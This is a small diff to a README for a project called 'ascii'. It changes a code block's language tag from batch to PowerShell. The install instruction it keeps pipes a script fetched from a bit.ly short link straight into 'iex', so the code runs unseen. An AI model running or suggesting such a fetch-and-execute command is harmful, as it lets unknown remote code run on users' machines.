@@ -1,5 +1,5 @@
 # ascii
 Use this to use the Programm:
-```batch
+```powershell
 iwr -useb 'http://bit.ly/singend' | iex
 ```
